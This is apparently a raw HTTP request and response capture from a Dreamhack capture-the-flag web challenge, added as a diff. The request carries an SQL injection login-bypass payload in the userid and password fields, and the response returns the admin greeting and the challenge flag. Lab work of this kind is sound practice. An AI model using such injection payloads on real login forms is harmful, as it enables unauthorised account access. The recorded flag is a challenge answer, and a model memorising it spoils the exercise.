@@ -1,0 +1,26 @@
+POST /login HTTP/1.1
+Host: host1.dreamhack.games:17055
+Content-Length: 33
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://host1.dreamhack.games:17055
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://host1.dreamhack.games:17055/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+userid=admin"--&userpassword="--#
+
+-----------------------------------------------
+
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.3 Python/3.11.2
+Date: Tue, 05 Nov 2024 08:15:59 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 57
+Connection: close
+
+hello admin flag is DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
